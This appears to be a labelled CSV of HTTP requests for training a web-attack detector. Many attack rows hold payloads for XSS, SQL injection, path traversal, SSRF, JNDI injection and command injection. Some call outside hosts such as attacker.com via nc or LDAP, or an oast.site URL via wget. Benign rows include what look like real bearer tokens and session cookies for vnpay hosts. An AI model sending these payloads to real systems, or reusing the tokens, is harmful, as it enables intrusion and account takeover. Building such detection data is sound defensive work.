method,path,query,headers,body,ua,label
GET,/icons/icon_top3.svg,,"Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: _ga=GA1.1.459466446.1771043995; _gcl_au=1.1.840801634.1771043995; _tt_enable_cookie=1; _ttp=01KHD75FHJ4NVN7Z6GME5TK937_.tt.1; _fbp=fb.1.1771043995548.11660241743256328; _ga_1XRVJ9DDS6=GS2.1.s1771043994$o1$g1$t1771044036$j18$l0$h0; ttcsid_CQQA2PJC77U11VCBE7G0=1771043995206::Mhh-U6jKc6NcTT-60ZX_.1.1771044044408.1; ttcsid_CQNEHUJC77UD2I8MDM90=1771043995203::nzOvr98EO7JZplsessyd.1.1771044050140.1; ttcsid=1771043995204::K3jC0qiBhVcwPGftPbW4.1.1771044050140.0::1.40884.49641::49192.9.342.238::54244.20.27; Host: agri-v2.vnshop.vn; If-Modified-Since: Mon, 26 Jan 2026 06:19:21 GMT; If-None-Match: W/""179a-19bf8f4f480""; Referer: https://agri-v2.vnshop.vn/auth/vnpay/login?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2FkvonsfD816bI4Ld6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvQ2Y%2BtgU3FaZO9E8EkZFMryS6MuYuOlmCWzObv%2FXIzn4gVYYlqtrrb3i%2Bg8Jpyr9BjDqQNoBojdceZ37Xqd1%2BnVMtwir3Lt%2BnGXp6XhTnWQVAKjSm8Zn8iOXMgd3N5OcezgRbBWpaXPModOyZyUqvVHG4Ij0QEk1e2lc8P7VV67VtJUa6IzAqf%2F7OlZBElF8NXRmqzIa1fKuV0%3D&signature=05e4c15aa541849ed89125ba7007eceb; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: image; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 16; PKG110 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.133 Mobile Safari/537.36; X-Requested-With: com.vnpay.Agribank3g",,"Mozilla/5.0 (Linux; Android 16; PKG110 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.133 Mobile Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: X-Forwarded-Host: attacker.com,,,1
GET,/favicon.ico,,,,,0
GET,/images/hero-banner.webp,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/index.php,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,curl/7.68.0,1
POST,/admin,,Host: example.com; Accept: */*,input=admin'--,Nmap Scripting Engine,1
GET,/,,Content-Type: application/json; Payload: %253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,Content-Type: application/json; Payload: ; echo $USER | nc attacker.com 1234,,,1
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
GET,/login,,Authorization: Bearer token123,,,0
PUT,/api/v1/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/podcasts/latest.xml,,Authorization: Bearer token123,,,0
POST,/webhooks/github,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/pmb/opac_css/getgif.php,chemin=../../../../../../etc/passwd&nomgif=PbDr,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",1
GET,/,,Content-Type: application/json; Payload: id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/backupmgt/pre_connect_check.php,auth_name=fail;wget+http://d6744efeec8flmt4u960qs6rcgtet7xyn.oast.site;,"Accept: */*; Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36",1
GET,/admin/data/autosuggest-remote.php,"q=""><img%20src=x%20onerror=alert(1)>","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",1
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/api/v1/documents,,Content-Type: application/json,,,0
GET,/api/v1/map/data,lat=21.0285&lng=105.8542&zoom=15,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <video><source onerror=""alert(1)"">",,,1
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/web-api/orders/0879b3d9-71a5-4bf9-9845-0be709ac752e,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzUxNjIxMjAiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiYjc3NjE2YWEtYzY5OS00NTM1LTk2NGQtOGM4OWM5MGM1YTgxIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzUxNjIxMjAiLCJzdWIiOiJXRUJTSVRFQDA3NzUxNjIxMjAiLCJpYXQiOjE3NzA2MzAzNzUsImV4cCI6MTc3MTIzNTE3NX0.AwJxSKm6x-akgsdhoBkC2Kby27RUbujeMc2wK6Q39gA; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: cf172301-b8a6-4b63-80a6-22b8c25908b4",,python-requests/2.32.5,0
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
PUT,/admin,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nmap Scripting Engine,1
POST,/,,Authorization: Bearer token123,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/xwiki/bin/deletespace/Sandbox/,xredirect=javascript:alert(document.domain),"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: query { __schema { types { name } } }",,,1
GET,/favicon.ico,,,,,0
GET,/wp-login.php,action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; es-es) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13",,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; es-es) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13",1
POST,/api/v1/orders,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/index.php,sl=../../../../../../../etc/passwd%00,"Accept-Encoding: gzip; Connection: close; Content-Type: application/x-www-form-urlencoded; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",,"Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",1
POST,/cart,,Host: example.com; Accept: */*,username=user176&password=pass452,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"Authorization: Bearer token123; Payload: <foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/web-api/orders/200908ff-dc20-4419-b7c1-939ef272c4dd,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQwMTM5NjEiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNTEwYTk4ZDktZTYwOS00Mjk1LTg4OTQtOTIzNjMxMDA2N2IwIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQwMTM5NjEiLCJzdWIiOiJXRUJTSVRFQDA3NzQwMTM5NjEiLCJpYXQiOjE3NzA2MzAyODUsImV4cCI6MTc3MTIzNTA4NX0.NVG9EdYdQW4ZMsVyYZWrvTVishILpqRj5U59Kgw7z7w; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 046225ae-977b-4981-8cf2-dea296fc36ce",,python-requests/2.32.5,0
POST,/auth/mfa/verify,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/stream/hls/chunk_001.ts,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,Content-Type: application/json; Payload: ; echo $USER | nc attacker.com 1234,,,1
POST,/,,Authorization: Bearer token123,"{""name"": ""__import__('os').system('id')""}",,1
GET,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/static/css/style.css,,Authorization: Bearer token123,,,0
GET,/products,category=electronics&brand=apple,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: `uname -a`",,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/contact,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/admin,,Host: example.com; Accept: */*,input=| cat /etc/passwd,sqlmap/1.5.2,1
POST,/,,Authorization: Bearer token123,"{""name"": ""__import__('os').system('id')""}",,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/web-api/orders/a7c10c17-74c9-4fae-81ec-0102b438fd4b,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzgzNDQ1NjgiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNDlhZjJhMWMtZjE0MC00ZTQ4LThkOWQtZTFmNmZmZWVlYzhmIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzgzNDQ1NjgiLCJzdWIiOiJXRUJTSVRFQDA3NzgzNDQ1NjgiLCJpYXQiOjE3NzA2MzAzNTUsImV4cCI6MTc3MTIzNTE1NX0.jSTA08Ag86enesNbXZH68LlinkI3qN09tpKfeo4Cc1g; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: db6e9665-42da-49c7-a04e-da49e6dfe98e",,python-requests/2.32.5,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,1
GET,/api/v1/tasks/rep_99/status,,Authorization: Bearer token123,,,0
GET,/admin/users,limit=20&offset=40,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/login,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
POST,/api/v1/logs/frontend,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: gopher://localhost:6379/_SET%20foo%20bar",,,1
POST,/login,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,id=1'/**/OR/**/'1'='1,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,1
GET,/,,Authorization: Bearer token123; Payload: http://169.254.169.254/latest/meta-data/,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: query { a: user(id:1) { name } b: user(id:2) { name } }",,,1
PUT,/admin,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nmap Scripting Engine,1
POST,/index.php,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,sqlmap/1.5.2,1
POST,/api/v1/sync/video,,Authorization: Bearer token123,,,0
PUT,/login,,Host: example.com; Accept: */*,input=; ls -la,curl/7.68.0,1
PUT,/search,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nmap Scripting Engine,1
GET,/manifest.json,,Content-Type: application/json,,,0
POST,/reviews,,Authorization: Bearer token123,,,0
PUT,/search,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nmap Scripting Engine,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: ../../../../etc/passwd%00",,,1
GET,/newsletter/unsubscribe,token=abc123def456,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/test-framework-api/user/node/status,,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiOTRjMTU5ZmItMjIyMC00OWU0LWFmZDctOGNlODU5ZGQ2MzE3Iiwic3ViIjoiaGFpbXRoQHZucGF5LnZuIiwiZW1haWwiOiJoYWltdGhAdm5wYXkudm4iLCJ0b2tlblR5cGUiOiJVU0VSIiwiaWF0IjoxNzcwNjI3NjkyfQ.VnknU796qMaEYTHPReq4Y7ywm6NSbUlBm7sU8S9D1L0XJ-ASm_XmaY7ENL-jlRtS0g_NaoYO6OGpXVzf8BScur39D1T5LjNdXLSaKyQpaET7VxSgFnupjq9FFVx0ilSTgpiQd1robu8QXt--vG5V31p4BSS6ghJMswjSWzFJuMPCnS2KSe3nCMeOxQPKFYXwyC4rP7PXbIAs7v2FknnWIJ4ZGn6gJIq4TwEgxrWyo0xM3F-i3u_iNeVR3P4tvMA-GNDAQHKTnThfI-mPfYYhpsc2MBP05Y7BA0X_bSddINX-qLITLdi8Z9uXOw_1P-Lq9jy2KEjCsDAjD35Hbez-dQ; Connection: keep-alive; Content-Type: application/json; Cookie: __Host-grv_app_session=bb025386f1724338b81d21e66d58aee135c703d9cfb604f251ec9cfaccd39f4e; __Host-grv_app_session_subject=dd77dde3d93f00c58773cbe9d3d9a609030b48d40328b61c8a38a5b28c088fae; Host: lqa.vnpay.vn; Language: en; Referer: https://lqa.vnpay.vn/qa-platform/; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36; X-Request-Id: afc9529b-6f30-40ec-a24f-bb7437807a71",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
GET,/admin/dashboard/users/active,,Content-Type: application/json,,,0
GET,/config/app-settings.json,,Content-Type: application/json,,,0
DELETE,/login,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
POST,/webhooks/github,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/checkout,,Host: example.com; Accept: */*,username=user155&password=pass718,Mozilla/5.0 (Linux; Android 11),0
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"Content-Type: application/json; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,Content-Type: application/json; Payload: ; cat /etc/passwd,,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/checkout/step1,,Authorization: Bearer token123,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ${jndi:ldap://attacker.com/a}",,,1
POST,/index.php,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
GET,/,,Authorization: Bearer token123; Payload: Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
POST,/,,Content-Type: application/json,{{7*7}}{{ '7'*7 }},,1
GET,/favicon.ico,,,,,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/vpn/user/download/client,ostype=../../../../../../../../../etc/passwd,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",1
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,Content-Type: application/json,,,1
GET,/,,Content-Type: application/json; Payload: %253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,Content-Type: application/json; Payload: id=1'; WAITFOR DELAY '0:0:5'--,,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/,,Content-Type: application/json,{{7*7}} or {{config.items()}},,1
GET,/,PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Safari/605.1.15",1
POST,/api/v1/projects,,Authorization: Bearer token123,,,0
GET,/downloads/guide-v2.pdf,,Authorization: Bearer token123,,,0
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/stats/requests,,"Accept: application/json; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: en-US,en;q=0.9,vi;q=0.8; Connection: keep-alive; Cookie: __Host-grv_app_session=a420f49e4e484e566b8a36e50d72009000c03c320c0940e399e841e9b66ed328; __Host-grv_app_session_subject=4dfd49932ac88c199a93f6df7d520ec96c53fe48235d21aa89e3a7cf63f2e960; Host: test-performance.poc.vnshop.cloud; Referer: https://test-performance.poc.vnshop.cloud/?tab=failures; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
POST,/,,Content-Type: application/json,{{7*7}}{{ '7'*7 }},,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/api/v1/payment/tokens,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/profile,,Host: example.com; Accept: */*,username=user362&password=pass699,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
DELETE,/index.php,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,curl/7.68.0,1
PUT,/admin,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/profile,,Host: example.com; Accept: */*,username=user844&password=pass415,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
POST,/api/v1/users,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/docs/api/introduction,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: phar://path/to/malicious.phar/shell.php",,,1
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/admin/reports/sales.csv,year=2025,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/admin/dashboard/users/active,,Content-Type: application/json,,,0
POST,/collect,v=1&tid=UA-XXXXX,Authorization: Bearer token123,,,0
